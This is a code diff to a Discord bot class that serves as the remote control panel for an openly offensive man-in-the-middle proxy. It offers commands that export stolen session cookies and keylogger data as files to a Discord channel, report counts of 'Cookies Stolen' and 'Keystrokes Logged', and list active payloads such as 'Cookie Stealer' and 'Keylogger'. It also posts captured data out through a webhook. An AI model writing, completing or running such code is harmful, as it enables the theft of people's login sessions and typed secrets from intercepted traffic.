@@ -15,37 +15,36 @@ class DiscordBot:
         print(f"{Fore.YELLOW}[*] Initializing Discord bot...{Fore.RESET}")
         self.webhook_url = webhook_url
         self.token = token
-        self.bot = None
-        self.running = True
         
-        # Initialize the bot with intents
+        # Initialize bot with intents
         intents = discord.Intents.default()
         intents.message_content = True
         intents.guilds = True
         self.bot = commands.Bot(command_prefix='/', intents=intents)
         
-        # Setup commands
-        self.setup_commands()
+        # Remove default help command
+        self.bot.remove_command('help')
         
-        # Start bot in a separate thread
-        self.bot_thread = threading.Thread(target=self.start)
-        self.bot_thread.daemon = True
-        self.bot_thread.start()
+        # Setup commands
+        async def setup():
+            await self.setup_commands()
+        asyncio.run(setup())
+        
+        # Start bot
+        self.start()
 
-    def setup_commands(self):
+    async def setup_commands(self):
         @self.bot.event
         async def on_ready():
             print(f"{Fore.GREEN}[+] Bot is ready as {self.bot.user.name}{Fore.RESET}")
             try:
-                # Force sync all commands
                 await self.bot.tree.sync()
                 print(f"{Fore.GREEN}[+] Commands synced successfully{Fore.RESET}")
             except Exception as e:
                 print(f"{Fore.RED}[!] Failed to sync commands: {e}{Fore.RESET}")
 
-        @self.bot.tree.command(name="help", description="Display all available commands")
-        async def help(interaction: discord.Interaction):
-            await interaction.response.send_message("Help command received!")
+        @self.bot.hybrid_command(name="help", description="Display all available commands")
+        async def help(ctx):
             embed = discord.Embed(
                 title="🔧 MITM Proxy Commands",
                 description="Available commands for the proxy bot",
@@ -65,8 +64,7 @@ class DiscordBot:
                 },
                 "⚙️ Control": {
                     "/stop": "Stop the proxy server",
-                    "/clear": "Clear all stored data",
-                    "/toggle": "Toggle specific payloads"
+                    "/clear": "Clear all stored data"
                 }
             }
             
@@ -77,32 +75,46 @@ class DiscordBot:
                     inline=False
                 )
             
-            await interaction.response.send_message(embed=embed)
+            await ctx.send(embed=embed)
 
-        @self.bot.tree.command(name="exportkl", description="Export and clear keylogger data")
-        async def exportkl(interaction: discord.Interaction):
-            await interaction.response.send_message("Export keylogger command received!")
+        @self.bot.hybrid_command(name="status", description="Check proxy status")
+        async def status(ctx):
+            try:
+                with open('cookies.json', 'r') as f:
+                    cookies = json.load(f)
+                with open('keylogs.json', 'r') as f:
+                    keylogs = json.load(f)
+                
+                embed = discord.Embed(
+                    title="📊 Proxy Status",
+                    description="Current proxy statistics",
+                    color=0x00ff00
+                )
+                
+                embed.add_field(name="Status", value="🟢 Running", inline=True)
+                embed.add_field(name="Cookies Captured", value=str(len(cookies)), inline=True)
+                embed.add_field(name="Keystrokes Logged", value=str(len(keylogs)), inline=True)
+                
+                await ctx.send(embed=embed)
+            except Exception as e:
+                await ctx.send(f"Error: {str(e)}")
+
+        @self.bot.hybrid_command(name="exportkl", description="Export keylogger data")
+        async def exportkl(ctx):
             try:
                 with open('keylogs.json', 'r') as f:
                     data = json.load(f)
                 
                 if not data:
-                    await interaction.response.send_message("❌ No keylogger data available!")
+                    await ctx.send("❌ No keylogger data available!")
                     return
 
-                # Create temp file for export
+                # Create temp file
                 with open('temp_keylog.json', 'w') as f:
                     json.dump(data, f, indent=2)
                 
-                # Send file and stats
-                embed = discord.Embed(
-                    title="📤 Keylogger Export",
-                    description=f"Exported {len(data)} entries",
-                    color=0x00ff00
-                )
-                
-                await interaction.response.send_message(
-                    embed=embed,
+                await ctx.send(
+                    content="📤 Keylogger Export",
                     file=discord.File('temp_keylog.json')
                 )
                 
@@ -114,30 +126,24 @@ class DiscordBot:
                 os.remove('temp_keylog.json')
                 
             except Exception as e:
-                await interaction.response.send_message(f"❌ Error: {str(e)}")
+                await ctx.send(f"Error: {str(e)}")
 
-        @self.bot.tree.command(name="exportck", description="Export and clear cookies")
-        async def exportck(interaction: discord.Interaction):
+        @self.bot.hybrid_command(name="exportck", description="Export cookies")
+        async def exportck(ctx):
             try:
                 with open('cookies.json', 'r') as f:
                     data = json.load(f)
                 
                 if not data:
-                    await interaction.response.send_message("❌ No cookie data available!")
+                    await ctx.send("❌ No cookie data available!")
                     return
 
-                # Create temp file for export
+                # Create temp file
                 with open('temp_cookies.json', 'w') as f:
                     json.dump(data, f, indent=2)
                 
-                embed = discord.Embed(
-                    title="📤 Cookie Export",
-                    description=f"Exported {len(data)} cookies",
-                    color=0x00ff00
-                )
-                
-                await interaction.response.send_message(
-                    embed=embed,
+                await ctx.send(
+                    content="📤 Cookie Export",
                     file=discord.File('temp_cookies.json')
                 )
                 
@@ -149,22 +155,15 @@ class DiscordBot:
                 os.remove('temp_cookies.json')
                 
             except Exception as e:
-                await interaction.response.send_message(f"❌ Error: {str(e)}")
+                await ctx.send(f"Error: {str(e)}")
 
-        @self.bot.tree.command(name="stop", description="Stop the proxy server")
-        async def stop(interaction: discord.Interaction):
-            embed = discord.Embed(
-                title="🛑 Stopping Proxy",
-                description="The proxy server is shutting down...",
-                color=0xff0000
-            )
-            await interaction.response.send_message(embed=embed)
-            # Graceful shutdown
-            self.running = False
+        @self.bot.hybrid_command(name="stop", description="Stop the proxy server")
+        async def stop(ctx):
+            await ctx.send("🛑 Stopping proxy server...")
             sys.exit(0)
 
-        @self.bot.tree.command(name="payloads", description="View active and inactive payloads")
-        async def payloads(interaction: discord.Interaction):
+        @self.bot.hybrid_command(name="payloads", description="View payload status")
+        async def payloads(ctx):
             payloads = {
                 "Cookie Stealer": True,
                 "Keylogger": True,
@@ -187,64 +186,7 @@ class DiscordBot:
                     inline=True
                 )
             
-            await interaction.response.send_message(embed=embed)
-
-        @self.bot.tree.command(name="status", description="Check proxy status")
-        async def status(interaction: discord.Interaction):
-            await interaction.response.send_message("Status command received!")
-            try:
-                with open('requests.json', 'r') as f:
-                    requests_data = json.load(f)
-                with open('cookies.json', 'r') as f:
-                    cookies_data = json.load(f)
-                with open('keylogs.json', 'r') as f:
-                    keylog_data = json.load(f)
-                
-                embed = discord.Embed(
-                    title="📊 Proxy Status",
-                    description="Current proxy statistics",
-                    color=0x00ff00
-                )
-                
-                embed.add_field(name="Status", value="🟢 Running", inline=True)
-                embed.add_field(name="Requests Captured", value=str(len(requests_data)), inline=True)
-                embed.add_field(name="Cookies Stolen", value=str(len(cookies_data)), inline=True)
-                embed.add_field(name="Keystrokes Logged", value=str(len(keylog_data)), inline=True)
-                
-                await interaction.response.send_message(embed=embed)
-                
-            except Exception as e:
-                await interaction.response.send_message(f"❌ Error: {str(e)}")
-
-        @self.bot.tree.command(name="clear", description="Clear all stored data")
-        async def clear(interaction: discord.Interaction):
-            try:
-                # Clear all JSON files
-                for file in ['cookies.json', 'keylogs.json', 'requests.json']:
-                    with open(file, 'w') as f:
-                        json.dump([], f)
-                
-                embed = discord.Embed(
-                    title="🧹 Data Cleared",
-                    description="All stored data has been cleared",
-                    color=0x00ff00
-                )
-                await interaction.response.send_message(embed=embed)
-                
-            except Exception as e:
-                await interaction.response.send_message(f"❌ Error: {str(e)}")
-
-    def start(self):
-        try:
-            print(f"{Fore.YELLOW}[*] Starting Discord bot...{Fore.RESET}")
-            self.bot.run(self.token)
-        except Exception as e:
-            print(f"{Fore.RED}[!] Bot error: {e}{Fore.RESET}")
-
-    def stop(self):
-        print(f"{Fore.YELLOW}[*] Stopping Discord bot...{Fore.RESET}")
-        if self.bot:
-            asyncio.run_coroutine_threadsafe(self.bot.close(), self.bot.loop)
+            await ctx.send(embed=embed)
 
     def send_webhook(self, data):
         try:
@@ -253,3 +195,10 @@ class DiscordBot:
                 print(f"{Fore.RED}[!] Webhook error: {response.status_code}{Fore.RESET}")
         except Exception as e:
             print(f"{Fore.RED}[!] Failed to send webhook: {str(e)}{Fore.RESET}")
+
+    def start(self):
+        try:
+            print(f"{Fore.YELLOW}[*] Starting Discord bot...{Fore.RESET}")
+            self.bot.run(self.token)
+        except Exception as e:
+            print(f"{Fore.RED}[!] Bot error: {e}{Fore.RESET}")
